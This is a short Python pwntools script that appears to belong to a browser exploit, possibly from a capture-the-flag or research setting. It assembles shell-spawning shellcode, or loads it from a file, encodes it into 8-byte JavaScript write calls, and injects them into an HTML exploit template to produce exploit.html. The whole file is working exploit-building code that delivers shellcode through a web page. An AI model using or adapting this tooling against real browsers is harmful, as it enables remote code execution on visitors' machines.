from pwn import *
context.arch = "amd64"

#print("{:08x}".format(u64(b"\xeb\xfe\x00\x00\x00\x00\x00\x00")))

sc = asm(shellcraft.sh())
sc = open("shellcode/sc.bin","rb").read(0x1000)
idx = 32
data = ""
for i in range(0,len(sc),8):
    t = sc[i:i+8]
    t = u64(t)
    data+=("await B[2].write(itof(0x{:08x}n), {});\n".format(t,idx))
    idx+=1



content = open("exploit.htmls","r").read().replace("BILLY_SHELLCODE",data)

with open("exploit.html","w") as file:
    file.write(content)


